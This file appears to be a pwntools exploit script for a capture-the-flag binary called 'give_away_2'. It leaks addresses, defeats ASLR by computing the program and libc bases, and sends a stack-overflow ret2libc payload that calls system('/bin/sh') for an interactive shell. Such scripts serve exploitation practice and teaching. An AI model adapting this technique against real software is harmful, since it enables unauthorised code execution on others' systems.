from pwn import *


def leak_addr():
    p.recvuntil(': ')
    return int(str(p.recv()),16)

p = process('./give_away_2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('libc-2.27.so')

offset = 40
pop_rdi = 0x0903 # : pop rdi ; ret

leak_main = leak_addr() 
log.info('main : {}'.format(hex(leak_main)))
base_addr = leak_main - 0x864
log.info('pop rdi : {}'.format(hex(base_addr + pop_rdi)))

payload = cyclic(offset)
payload += p64(leak_main + 21)

p.sendline(payload)

stdin = leak_addr() - 131
log.info('_IO_2_1_stdin_ : {}'.format(hex(stdin)))
libc_base = stdin  - libc.sym['_IO_2_1_stdin_']
log.info('base : {}'.format(hex(libc_base)))
system = libc_base + libc.sym['system']
log.info('system : {}'.format(hex(system)))
binsh = libc_base + libc.search('/bin/sh').next()
log.info('base : {}'.format(hex(binsh)))

payload = cyclic(offset)
payload += p64(base_addr + pop_rdi)
payload += p64(binsh)
payload += p64(system)

gdb.attach(p)
p.sendline(payload)
p.interactive()
